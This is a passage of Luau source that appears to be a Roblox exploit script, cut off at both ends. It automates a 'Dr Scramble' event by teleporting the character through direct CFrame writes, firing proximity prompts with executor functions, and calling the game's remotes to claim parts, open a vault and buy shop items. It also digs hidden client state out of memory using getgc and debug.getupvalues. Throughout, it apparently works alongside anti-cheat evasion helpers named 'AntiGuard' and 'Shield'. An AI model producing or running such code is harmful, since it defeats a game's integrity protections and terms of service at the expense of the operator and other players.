						Build = function(arg)
							v20 = arg

							tbl26.Card = arg:Frame({
								X = 0,
								Y = 0,
								Width = 1,
								Height = 3.6,
								Corner = 0.3,
								Background = "#151821",
								BackgroundTransparency = 0.25,
							})

							tbl26.Accent = arg:Frame({
								Parent = tbl26.Card,
								X = 0.08,
								Y = 0.18,
								Width = 0.16,
								Height = 3.24,
								Corner = 0.2,
								Background = tbl28.idle,
							})

							tbl26.Icon = arg:Image({
								Parent = tbl26.Card,
								X = 0.42,
								Y = 0.3,
								Width = 3,
								Height = 3,
								Corner = 0.3,
								Background = "#242938",
								BackgroundTransparency = 0.1,
								StrokeThickness = 0.06,
								StrokeTransparency = 0,
								Visible = false,
							})

							tbl26.Title = arg:Text({
								Parent = tbl26.Card,
								X = 3.7,
								Y = 0.32,
								Width = 1,
								Height = 1.05,
								Scale = 1.16,
								Wrap = false,
								Text = str4,
								Color = tbl28.idle,
								TextStrokeTransparency = 1,
							})

							tbl26.Egg = arg:Text({
								Parent = tbl26.Card,
								X = 3.7,
								Y = 1.42,
								Width = 1,
								Height = 1,
								Scale = 1,
								Wrap = false,
								Text = str6,
								Color = "#FFFFFF",
								TextStrokeTransparency = 1,
							})

							tbl26.Meta = arg:Text({
								Parent = tbl26.Card,
								X = 3.7,
								Y = 2.42,
								Width = 1,
								Height = 0.9,
								Scale = 0.86,
								Wrap = false,
								Text = "Left 0   Tries 0   Applied 0",
								Color = "#AEB4C6",
								TextStrokeTransparency = 1,
							})

							fn33()
						end,
					})

					fn4(function()
						pcall(function()
							v21:Destroy()
						end)
					end)
				else
					v19 = v7:CreateText({ Name = "Mutation Status", Text = "Idle", SubOf = v18 })
				end
			end

			v7:CreateDropdown({
				Name = "Mutation Min Rarity",
				Note = "Only eggs of this rarity and above are used",
				Options = tbl7,
				Default = tbl7[1],
				SubOf = v18,
				Callback = function(arg)
					n20 = tbl8[arg] or 0
				end,
			})

			do
				local tbl27 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
				}

				local tbl28 = { Slider = nil, Value = 0, Unit = "M/s" }

				local function fn35(arg, arg2)
					if arg ~= nil then
						tbl28.Value = math.max(0, math.floor(tonumber(arg) or tbl28.Value))
					end

					if arg2 ~= nil then
						tbl28.Unit = tostring(arg2)
					end

					tbl22.Value = tbl28.Value * (tbl27[tbl28.Unit] or tbl27["M/s"]).Mult
				end

				tbl28.Slider = fn5(v7, {
					Name = "Min Mutation Value",
					Note = "Skip eggs worth less than this (0 = off)",
					SubOf = v18,
					Legacy = "Mutation Min Value",
					SectionName = "Auto Rift & Boss",
					OnRaw = function(arg)
						fn35(math.floor(arg / 1000), "K/s")
					end,
				})
			end

			v7:CreateDropdown({
				Name = "Mutation Priority",
				Note = "Which egg gets the consumable first",
				Options = tbl21,
				Default = tbl21[1],
				SubOf = v18,
				Callback = function(arg)
					str3 = tostring(arg)
				end,
			})

			fn6(v7:CreateMultiDropdown({
				Name = "Mutation Target Eggs",
				Note = "Only use the consumable on these eggs (empty = all)",
				Options = tbl23,
				Default = {},
				SubOf = v18,
				Callback = function(arg)
					local tbl27 = {}

					if type(arg) == "table" then
						for k, v20 in pairs(arg) do
							local flag7 = v20 == true and type(k) == "string" and k

							if flag7 then
								v20 = flag7
							else
								v20 = type(v20) == "string" and v20
							end

							v20 = v20 or nil

							if v20 and tbl24[v20] then
								tbl27[tbl24[v20]] = true
							end
						end
					end

					tbl25 = tbl27
				end,
			}))

			fn4(function()
				n19 += 1
				tbl4.Movement.FracturedWanted = false
				tbl4.ReleaseMovement("fractured")
			end)

			tbl3.Add(function()
				local v20 = tbl4.Toggle(v14, false)
				local v21 = tbl4.Toggle(v15, false)
				local n23 = (v20 or v21) and 5 or 30
				local flag7 = not flag5

				if flag7 then
					flag7 = v16 == nil or n17 == 0 or os.clock() - n18 >= n23
				end

				if flag7 then
					flag5 = true

					task.spawn(function()
						pcall(fn30, true)
						flag5 = false
					end)
				end

				if v17 and type(v17.Set) == "function" then
					pcall(v17.Set, v17, fn31())
				end

				local flag8 = flag4

				if not flag4 then
					flag8 = not (v20 or v21)
				end

				if flag8 or os.clock() < n16 then
					return false
				end
				flag4 = true
				n16 = os.clock() + n14
				local v22 = n15

				task.spawn(function()
					pcall(fn32, v22)
					flag4 = false
					tbl3.Wake()
				end)

				return false
			end)

			local save2 = tbl.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				local ok, result = pcall(save2.FieldSignal, "Rift")

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						n17 = 0
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end

			n3 = 6
			n4 = 1.5
			n9 = 400
			local vector
			vector = Vector3.new(2120, -120, -355)
			tbl15 = { "LostPart1", "LostPart2" }

			tbl16 = {
				{ Label = "Experiment #001", Id = "LimitedTimeExperimentPet" },
				{ Label = "Nibbles #013", Id = "Nibbles013" },
				{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
				{ Label = "2x Cash Booster", Id = "CashBooster" },
				{ Label = "1.25x Speed", Id = "SpeedBoost" },
				{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
			}

			tbl17 = {}

			for _, v20 in ipairs(tbl16) do
				tbl17[#tbl17 + 1] = v20.Label
			end

			tbl9 = {}
			tbl10 = {}
			n10 = 0
			tbl18 = { ["Experiment #001"] = true, ["Nibbles #013"] = true, ["Scrambled Mutation"] = true }
			snapshot = nil
			n5 = -math.huge
			flag = false
			n6 = 0
			n7 = 0
			str = ""
			str2 = ""
			tbl19 = { Tool = nil, EquipAt = 0 }
			n11 = 16
			flag3 = false
			n12 = 0.3
			n13 = 0.4
			tbl20 = { Index = 1, Since = 0, Tool = nil }
			tbl11 = { Latch = false, Ended = false }
			flag2 = false
			n8 = 0
			v11 = nil
			v12 = nil
			v13 = nil

			local function fn35()
				local packages = ReplicatedStorage:FindFirstChild("Packages")
				packages = packages and packages:FindFirstChild("Networking")
				packages = packages and packages:FindFirstChild("RF/Scramble/Request")
				if packages and packages:IsA("RemoteFunction") then
					return packages
				end
				return nil
			end

			fn20 = function(arg, ...)
				local v20 = fn35()
				if not v20 then
					return nil
				end
				local v21 = table.pack(...)

				local ok, result = pcall(function()
					return v20:InvokeServer(arg, table.unpack(v21, 1, v21.n))
				end)

				if not ok or type(result) ~= "table" then
					return nil
				end

				if type(result.Snapshot) == "table" then
					snapshot = result.Snapshot
					n5 = os.clock()
				elseif arg == "Snapshot" and type(result.State) == "table" then
					snapshot = result
					n5 = os.clock()
				end

				return result
			end

			fn8 = function(arg)
				if arg or snapshot == nil or os.clock() - n5 >= n3 then
					fn20("Snapshot")
				end

				return snapshot
			end

			fn21 = function()
				local v20 = snapshot
				return type(v20) == "table" and type(v20.State) == "table" and v20.State or nil
			end

			fn9 = function()
				local v20 = snapshot
				if type(v20) ~= "table" or v20.Enabled == false or type(v20.State) ~= "table" then
					return false
				end
				local num = tonumber(v20.EventEndsAt)
				return num == nil or workspace:GetServerTimeNow() < num
			end

			fn10 = function()
				local v20 = snapshot
				local window = type(v20) == "table" and v20.Window or nil
				if type(window) ~= "table" then
					return false, nil
				end
				local serverTimeNow = workspace:GetServerTimeNow()
				local num = tonumber(window.StartsAt)
				local num2 = tonumber(window.EndsAt)
				local flag7 = window.Active == true
				local flag8

				if flag7 then
					flag8 = flag7
				else
					flag8 = num and num2 and serverTimeNow >= num and serverTimeNow < num2
				end

				if flag8 then
					return true, num2 and math.max(0, num2 - serverTimeNow) or nil
				end
				local num3 = tonumber(window.NextAt)
				return false, num3 and math.max(0, num3 - serverTimeNow) or nil
			end

			fn22 = function(arg, arg2)
				local lostParts = type(arg) == "table" and arg.LostParts or nil
				if type(lostParts) ~= "table" then
					return false
				end

				if lostParts[arg2] then
					return true
				end

				for _, lostPart in pairs(lostParts) do
					if lostPart == arg2 then
						return true
					end
				end

				return false
			end

			fn23 = function(arg)
				local n23 = 0

				for _, v20 in ipairs(tbl15) do
					if fn22(arg, v20) then
						n23 += 1
					end
				end

				return n23
			end

			local function fn36(arg)
				local n23 = math.max(0, math.floor(tonumber(arg) or 0))
				if n23 >= 3600 then
					return string.format("%dh %dm", n23 // 3600, n23 % 3600 // 60)
				end
				return string.format("%dm %ds", n23 // 60, n23 % 60)
			end

			fn11 = function()
				local v20 = fn21()
				if not v20 then
					return "Dr Scramble event is not running"
				end

				if not fn9() then
					return "Dr Scramble event has ended"
				end
				local v21, v22 = fn10()
				local str9

				if v21 then
					str9 = "Outbreak live " .. fn36(v22 or 0)
				else
					str9 = v21
				end

				str9 = str9 or v22 and "Outbreak in " .. fn36(v22) or "Outbreak soon"
				local str10 = v20.Completed == true and "Vault claimed"

				if not str10 then
					str10 = string.format("Lost %d/2  Drone %d/3", fn23(v20), math.min(3, tonumber(v20.DroneParts) or 0))
				end

				if v21 then
					local n23 = 0

					for _, v23 in pairs(tbl9) do
						if (tonumber(v23.Health) or 0) > 0 then
							n23 += 1
						end
					end

					str9 ..= string.format("  %d drones", n23)
				end

				local str11 = string.format("Samples %d  -  %s  -  %s", tonumber(v20.Samples) or 0, str10, str9)

				if str2 ~= "" and tbl4.Toggle(v11, false) then
					str11 ..= "  -  " .. str2
				end

				if str ~= "" then
					str11 ..= "  -  " .. str
				end

				return str11
			end

			fn24 = function()
				return tbl4.Root()
			end

			fn25 = function(arg, arg2, arg3, arg4)
				local v20 = arg4 or n9
				local v21 = fn24()
				if not v21 then
					return false
				end
				arg3 = arg3 or 1
				if (v21.Position - arg).Magnitude <= arg3 then
					return true
				end
				tbl4.Shield("scramble", true)
				local n23 = os.clock() + 6

				while not tbl4.Swapped() and os.clock() < n23 and not arg2() do
					str = "Waiting for the character to settle"
					RunService.Heartbeat:Wait()
				end

				local v22 = fn24() or v21
				local character = localPlayer.Character
				tbl4.Driving = tbl4.Driving + 1
				local position = v22.Position
				local flag7 = nil
				local n24 = (arg - position).Magnitude / v20 + 3
				local n25 = 0

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					if flag7 ~= nil or tbl4.AntiGuard.Busy then
						return
					end
					n25 += deltaTime
					local v23 = fn24()
					if not v23 or arg2() or n25 > n24 or localPlayer.Character ~= character then
						flag7 = false
						return
					end

					if (v23.Position - position).Magnitude > 8 then
						position = v23.Position
					end

					local n26 = arg - position
					local n27 = v20 * deltaTime
					local flag8 = n26.Magnitude <= math.max(n27, arg3)
					position = flag8 and arg or position + n26.Unit * n27
					local vector2 = Vector3.new(n26.X, 0, n26.Z)
					local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v23.CFrame.Rotation

					pcall(function()
						v23.CFrame = CFrame.new(position) * cframe
						v23.AssemblyLinearVelocity = Vector3.zero
						v23.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag8 then
						flag7 = true
					end
				end)

				while flag7 == nil do
					RunService.Heartbeat:Wait()
				end

				connection:Disconnect()
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield("scramble", false)
				return flag7
			end

			fn26 = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("ProximityPrompt") then
					return false
				end

				local ok = pcall(function()
					arg:InputHoldBegin()
					local n23 = tonumber(type(tbl4.PromptHold) == "function" and tbl4.PromptHold(arg) or arg.HoldDuration) or 0

					if n23 > 0 then
						task.wait(n23 + 0.2)
					end

					arg:InputHoldEnd()
				end)

				if not ok and type(fireproximityprompt) == "function" then
					ok = pcall(fireproximityprompt, arg)
				end

				return ok
			end

			local function fn37()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("SecretZones")
				return world and world:FindFirstChild("Cave") or nil
			end

			fn27 = function(arg)
				local teleporter = fn37()
				teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
				teleporter = teleporter and teleporter:FindFirstChild(arg)
				teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
				return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
			end

			fn28 = function(arg, arg2)
				arg = arg and arg.Parent
				if arg and arg:IsA("Attachment") then
					return arg.WorldPosition
				end

				if arg and arg:IsA("BasePart") then
					return arg.Position
				end
				return arg2
			end

			fn29 = function()
				local v20 = fn24()
				if not v20 then
					return false
				end
				local position = v20.Position
				local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
				return position.Y < -60 and vector2.Magnitude < 160
			end
		end

		local fn30

		local function fn31()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")
			return world and world:IsA("BasePart") and world.Position.X or 552
		end

		fn30 = function(arg)
			if not arg then
				arg = fn24()
				arg = arg and arg.Position
			end

			return arg ~= nil and arg.X < fn31()
		end

		local connection = localPlayer.CharacterAdded:Connect(function()
			tbl4.ScrambleRespawned = true
			tbl19.Tool = nil
			tbl19.EquipAt = 0
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		local fn32

		fn32 = function(arg, arg2)
			if not fn30() then
				tbl4.ScrambleRespawned = false
				return true
			end

			if arg2 and fn30(arg2) then
				return true
			end

			local function fn33()
				str = "Respawned, resting in the safe zone"
				local n14 = os.clock() + 0.75

				while os.clock() < n14 do
					if arg() then
						return false
					end
					task.wait(0.1)
				end

				tbl4.ScrambleRespawned = false
				return true
			end

			local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
			if not flag4 then
				tbl4.ScrambleRespawned = false
				return true
			end
			local flag5 = tbl4.ScrambleRespawned == true

			if tbl4.DistanceTo(flag4) <= 12 then
				if flag5 then
					return (fn33())
				end
				return true
			end

			str = flag5 and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
			local v14 = fn25
			local v15 = v14(flag4 + Vector3.new(0, 3, 0), arg, 3, flag5 and math.min(n9, 300) or nil)
			if v15 and flag5 then
				return (fn33())
			end
			return v15
		end

		local fn33, fn34

		do
			local function fn35(arg, arg2, arg3)
				local v14 = fn24()
				if not v14 then
					return false
				end
				tbl4.Shield("scramblefly", true)
				local position = v14.Position
				local flag4 = true

				if Vector3.new(arg.X - position.X, 0, arg.Z - position.Z).Magnitude > 250 then
					local n14 = math.max(position.Y, arg.Y, 98)
					flag4 = fn25(Vector3.new(position.X, n14, position.Z), arg2, 2) and fn25(Vector3.new(arg.X, n14, arg.Z), arg2, 2)
				end

				flag4 = flag4 and fn25(arg, arg2, math.min(arg3, 2))
				tbl4.Shield("scramblefly", false)
				return flag4
			end

			local function fn36()
				local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
				return flag4 and flag4 + Vector3.new(0, 3, 0) or nil
			end

			fn33 = function(arg, arg2, arg3)
				local n14 = arg3 or 6
				if tbl4.DistanceTo(arg) <= n14 then
					return true
				end
				local v14 = fn30()
				local v15 = fn30(arg)

				if v14 and not v15 then
					if not fn32(arg2, arg) then
						return false
					end
				elseif v15 and not v14 then
					local v16 = fn36()

					if v16 and (v16 - arg).Magnitude > 12 and tbl4.DistanceTo(v16) > 12 then
						str = "Coming back through the safe zone"
						if not fn35(v16, arg2, 3) then
							return false
						end
					end
				end

				return fn35(arg, arg2, n14)
			end

			fn34 = function(arg)
				if fn30() or arg() or tbl4.IsNight() or tbl4.WallSealed() then
					return
				end
				local v14 = fn36()

				if v14 then
					str = "Coming back through the safe zone"
					fn33(v14, arg, 4)
				end
			end
		end

		local fn35

		fn35 = function(arg)
			if fn29() then
				return true
			end
			local Entry = fn27("Entry")
			local v14 = fn28(Entry, Vector3.new(2125.7, 73.1, -295.4))
			str = "Flying to the Secret Cave"
			if not fn33(v14, arg, 6) then
				return false
			end

			for i = 1, 4 do
				if arg() then
					return false
				end
				str = "Entering the Secret Cave"
				fn26(Entry or fn27("Entry"))
				local n14 = os.clock() + 1.5

				while os.clock() < n14 and not fn29() do
					RunService.Heartbeat:Wait()
				end

				if fn29() then
					return true
				end
			end

			str = "Cave door missed, flying in"
			local quest = type(snapshot) == "table" and snapshot.Quest or nil
			local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil

			if typeof(position) == "Vector3" then
				pcall(tbl4.FlyTo, position, arg, "scramble")
			end

			return fn29()
		end

		local fn36, fn37, fn38

		do
			local function fn39(arg)
				local quest = type(snapshot) == "table" and snapshot.Quest or nil
				local flag4 = type(quest) == "table" and quest[arg] or nil
				local position = type(flag4) == "table" and flag4.Position or nil
				if typeof(position) == "Vector3" then
					return position
				end
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
				drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(arg)
				if drScrambleEvent and drScrambleEvent:IsA("Model") then
					return drScrambleEvent:GetPivot().Position
				end
				return nil
			end

			local function fn40(arg)
				local v14 = snapshot
				local interactions = type(v14) == "table" and v14.Interactions or nil
				return math.max(4, (type(interactions) == "table" and tonumber(interactions[arg]) or 12) - 4)
			end

			fn36 = function(arg)
				local v14 = fn21()
				if not v14 or v14.Discovered == true then
					return true
				end
				local EscapedExperiment = fn39("EscapedExperiment")
				if not EscapedExperiment or not fn35(arg) then
					return false
				end
				str = "Talking to the Escaped Experiment"
				if not fn25(EscapedExperiment, arg, fn40("NpcRadius")) then
					return false
				end
				local Discover = fn20("Discover")
				fn8(true)
				return Discover ~= nil and fn21() ~= nil and fn21().Discovered == true
			end

			fn37 = function(arg)
				local v14 = fn21()
				local flag4 = not v14 or v14.Completed == true

				if not flag4 then
					local n14 = #tbl15
					flag4 = fn23(v14) >= n14
				end

				if flag4 then
					return
				end

				if v14.Discovered ~= true and not fn36(arg) then
					return
				end

				for _, v15 in ipairs(tbl15) do
					if arg() then
						return
					end

					if not fn22(fn21(), v15) then
						local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
						drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(v15)
						drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
						local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
						local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or fn39(v15)

						if position then
							str = "Flying to " .. (v15 == "LostPart1" and "Lost Part 1" or "Lost Part 2")

							if fn33(position + Vector3.new(0, 2, 0), arg, 3) then
								str = "Collecting the lost part"
								local n14 = position + Vector3.new(0, 2.5, 0)
								local character = localPlayer.Character
								tbl4.Shield("scramble", true)
								tbl4.Driving = tbl4.Driving + 1

								local connection2 = RunService.Heartbeat:Connect(function()
									local v16 = tbl4.Root()
									if not v16 or v16.Parent ~= character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
										return
									end

									pcall(function()
										local rotation = v16.CFrame.Rotation
										v16.CFrame = CFrame.new(n14) * rotation
										v16.AssemblyLinearVelocity = Vector3.zero
										v16.AssemblyAngularVelocity = Vector3.zero
									end)
								end)

								for i = 1, 4 do
									if not arg() then
										claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
										fn26(claimLostPart)
										task.wait(0.6)
										fn8(true)
										if not fn22(fn21(), v15) then
											continue
										end
									end

									break
								end

								connection2:Disconnect()
								tbl4.Driving = math.max(0, tbl4.Driving - 1)
								tbl4.Shield("scramble", false)
								if arg() then
									return
								end
								continue
							end
						end
					end
				end
			end

			fn38 = function(arg)
				local v14 = fn21()
				if not v14 or v14.Completed == true then
					return
				end
				local num = tonumber(v14.TotalParts)

				if not num then
					num = fn23(v14) + (tonumber(v14.DroneParts) or 0)
				end

				if num < 5 then
					return
				end
				local ExperimentVault = fn39("ExperimentVault")
				if not ExperimentVault or not fn35(arg) then
					return
				end
				str = "Opening the Experiment Vault"
				if not fn25(ExperimentVault, arg, fn40("VaultRadius")) then
					return
				end
				fn20("Vault")
				fn8(true)
				local v15 = fn21()

				if v15 and v15.Completed == true then
					str = "Vault opened, The Scrambler unlocked"
				end
			end
		end

		local fn39

		fn39 = function()
			local function fn40(arg)
				if not arg or not arg:IsA("Tool") then
					return false
				end

				if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
					return false
				end
				local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
				if attribute ~= nil then
					return tostring(attribute) == "Scrambled"
				end
				return string.find(string.lower(arg.Name), "scrambled", 1, true) ~= nil
			end

			local character = localPlayer.Character

			if character then
				for _, child in ipairs(character:GetChildren()) do
					if fn40(child) then
						return child, true
					end
				end
			end

			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if fn40(child) then
						return child, false
					end
				end
			end

			return nil, false
		end

		local fn40

		fn40 = function(arg, arg2)
			local shopPurchases = type(arg) == "table" and arg.ShopPurchases or nil
			local flag4 = type(shopPurchases) == "table" and shopPurchases[arg2.Id] or nil
			if type(flag4) ~= "table" then
				return 0
			end
			local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
			if flag4.Period ~= nil and shopPeriod ~= nil and flag4.Period ~= shopPeriod then
				return 0
			end
			return tonumber(flag4.Count) or 0
		end

		fn12 = function(arg)
			local v14 = fn8(true)
			if type(v14) ~= "table" or type(v14.Shop) ~= "table" then
				return
			end

			for _, v15 in ipairs(tbl16) do
				if arg() then
					return
				end

				if tbl18[v15.Label] == true then
					for i = 1, 10 do
						local v16 = snapshot
						local v17 = fn21()
						local v18, v19, v20 = ipairs(type(v16) == "table" and v16.Shop or {})
						local v21 = nil

						for _, v22 in v18, v19, v20 do
							if type(v22) == "table" and v22.Id == v15.Id then
								v21 = v22
							end
						end

						if not (not v21 or not v17 or arg()) then
							local num = tonumber(v21.PurchaseLimit)

							if not (num and fn40(v17, v21) >= num) then
								if not ((tonumber(v17.Samples) or 0) - (tonumber(v21.Price) or math.huge) < n10) then
									local Shop = fn20("Shop", v21.Id, { Quote = v21.Quote, Sequence = tonumber(v17.ShopSequence) or 0 })

									if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
										str = "Bought " .. v15.Label
										task.wait(0.4)
										continue
									end
								end
							end
						end

						break
					end
				end
			end
		end

		local n14
		n14 = 98
		local n15
		n15 = 12
		local n16
		n16 = 20
		local n17
		n17 = 3
		local tbl21

		tbl21 = {
			Vector3.new(2000, 90, -360),
			Vector3.new(2700, 90, -370),
			Vector3.new(3400, 90, -365),
			Vector3.new(4100, 90, -360),
			Vector3.new(4800, 90, -370),
			Vector3.new(5500, 90, -360),
			Vector3.new(5900, 90, -365),
		}

		tbl12 = {}
		local tbl22
		tbl22 = { Link = nil, Goal = nil, Look = nil, Character = nil }
		local tbl23, tbl24, tbl25, tbl26, str3, tbl27, str4, n18, n19, n20
		local n21, fn41, fn42

		do
			local userId = localPlayer.UserId

			tbl23 = {
				{ Label = "Scrap Drone", Tier = "ScrapDrone" },
				{ Label = "Reactor Drone", Tier = "ReactorDrone" },
				{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
			}

			tbl24 = {}

			for _, v14 in ipairs(tbl23) do
				tbl24[#tbl24 + 1] = v14.Label
			end

			tbl25 = { "Nearest", "Rare First", "Most HP First" }
			tbl26 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
			str3 = tbl25[1]
			tbl27 = { "Tween", "Teleport" }
			str4 = tbl27[1]
			n18 = 110
			n19 = 1.5
			n20 = 0
			n21 = -math.huge

			local function fn43(arg)
				local num = type(arg) == "table" and tonumber(arg.OwnerUserId) or nil
				return num == nil or num == userId
			end

			local function fn44(arg)
				if typeof(arg) == "CFrame" then
					return arg.Position
				end

				if typeof(arg) == "Vector3" then
					return arg
				end
				return nil
			end

			local function fn45(arg, arg2)
				local v14 = networking:FindFirstChild(arg)
				if not v14 or not v14:IsA("RemoteEvent") then
					return
				end

				local connection2 = v14.OnClientEvent:Connect(function(...)
					pcall(arg2, ...)
				end)

				fn4(function()
					pcall(function()
						connection2:Disconnect()
					end)
				end)
			end

			fn45("RE/Scramble/Drones", function(arg)
				if type(arg) ~= "table" then
					return
				end
				local v14 = pairs
				local upserts = type(arg.Upserts) == "table" and arg.Upserts or {}

				for _, upsert in v14(upserts) do
					if type(upsert) == "table" and upsert.Id ~= nil and fn43(upsert) then
						local id = tostring(upsert.Id)
						local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
						local tbl28 = tbl9[id] or {}
						tbl28.Id = id
						tbl28.Position = fn44(upsert.CFrame) or tbl28.Position
						tbl28.Health = tonumber(upsert.Health) or tbl28.Health or 1
						tbl28.Tier = tostring(attributes.ScrambleTier or tbl28.Tier or "")
						tbl28.Area = tostring(attributes.ScrambleArea or tbl28.Area or "")
						tbl28.Seen = os.clock()
						tbl9[id] = tbl28
					end
				end

				local v15 = pairs
				local removed = type(arg.Removed) == "table" and arg.Removed or {}

				for k, v16 in v15(removed) do
					local v17 = tbl9
					local v18 = tostring
					v16 = type(v16) == "string" and v16 or k
					v17[v18(v16)] = nil
				end
			end)

			fn45("RE/Scramble/Effect", function(arg, arg2, arg3)
				if arg ~= "Hit" or type(arg3) ~= "table" or arg3.DroneId == nil then
					return
				end
				local v14 = tbl9[tostring(arg3.DroneId)]
				if not v14 then
					return
				end
				v14.Position = fn44(arg2) or v14.Position
				v14.Health = (tonumber(v14.Health) or 1) - (tonumber(arg3.Amount) or 1)

				if type(arg3.Motion) == "string" and string.find(arg3.Motion, "\"Death\"", 1, true) then
					v14.Health = 0
				end

				if v14.Health <= 0 then
					tbl9[v14.Id] = nil
				end
			end)

			fn45("RE/Scramble/Drops", function(arg)
				local v14 = pairs
				arg = type(arg) == "table" and arg or {}

				for _, v15 in v14(arg) do
					if type(v15) == "table" and v15.Id ~= nil and fn43(v15) then
						local v16 = fn44(v15.Position) or fn44(v15.Origin)

						if v16 then
							tbl10[tostring(v15.Id)] = {
								Position = v16,
								Radius = tonumber(v15.Radius) or 6,
								ExpiresAt = tonumber(v15.ExpiresAt),
								Kind = v15.Kind,
							}
						end
					end
				end
			end)

			fn45("RE/Scramble/State", function(arg)
				if type(arg) ~= "table" then
					return
				end

				if arg.Patch == true and type(snapshot) == "table" then
					for k, v14 in pairs(arg) do
						if k ~= "Patch" then
							snapshot[k] = v14
						end
					end
				elseif type(arg.State) == "table" then
					snapshot = arg
				end

				n5 = os.clock()
			end)

			fn45("RE/Scramble/RemoveDrops", function(arg)
				local v14 = pairs
				arg = type(arg) == "table" and arg or {}

				for k, v15 in v14(arg) do
					tbl10[tostring(type(v15) == "string" and v15 or k)] = nil
				end
			end)

			fn41 = function(arg)
				local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
				return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. arg) or nil
			end

			local v14 = nil
			local n22 = 0

			local function fn46()
				if v14 and next(v14) ~= nil then
					return v14
				end
				v14 = nil
				if os.clock() < n22 or type(getgc) ~= "function" or not fn10() then
					return nil
				end
				n22 = os.clock() + 15

				for _, v15 in ipairs(getgc(false)) do
					if type(v15) == "function" and islclosure(v15) then
						local ok, result = pcall(debug.info, v15, "s")

						if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
							local ok2, result2 = pcall(debug.getupvalues, v15)

							if ok2 and type(result2) == "table" then
								for _, v16 in pairs(result2) do
									if type(v16) == "table" then
										local key, v17 = next(v16)
										if type(v17) == "table" and v17.OwnerUserId ~= nil and v17.CFrame ~= nil then
											v14 = v16
											return v16
										end
									end
								end

								continue
							end
						end
					end
				end

				return nil
			end

			local function fn47()
				local v15 = fn46()
				if not v15 then
					return
				end

				for k, v16 in pairs(v15) do
					if type(v16) == "table" and fn43(v16) then
						local str5 = tostring(v16.Id or k)
						local attributes = type(v16.Attributes) == "table" and v16.Attributes or {}
						local tbl28 = tbl9[str5]
						local health = tonumber(v16.Health)

						if not tbl28 then
							tbl28 = { Id = str5 }
							health = health or 1
							tbl28.Health = health
							tbl9[str5] = tbl28
						elseif health then
							tbl28.Health = math.min(health, tonumber(tbl28.Health) or health)
						end

						tbl28.Position = fn44(v16.CFrame) or tbl28.Position
						tbl28.Tier = tostring(attributes.ScrambleTier or tbl28.Tier or "")
						tbl28.Area = tostring(attributes.ScrambleArea or tbl28.Area or "")

						if attributes.DroneState == "Death" then
							tbl28.Health = 0
						end
					end
				end

				for k in pairs(tbl9) do
					if v15[k] == nil then
						tbl9[k] = nil
					end
				end
			end

			fn42 = function()
				pcall(fn47)
				local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
				if not scrambleLocalVisuals then
					return
				end

				for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
					local attribute = child:GetAttribute("ScrambleDroneId")

					if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
						local str5 = tostring(attribute)

						if child:GetAttribute("DroneState") == "Death" then
							tbl9[str5] = nil
						elseif not tbl9[str5] then
							local ok, result = pcall(child.GetPivot, child)

							tbl9[str5] = {
								Id = str5,
								Position = ok and result.Position or nil,
								Health = tonumber(child:GetAttribute("Health")) or 1,
								Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
								Area = tostring(child:GetAttribute("ScrambleArea") or ""),
								Seen = os.clock(),
							}
						end
					end
				end
			end
		end

		local fn43

		fn43 = function(arg)
			local v14 = fn41(arg.Id)
			local hitbox = v14 and v14:FindFirstChild("Hitbox")
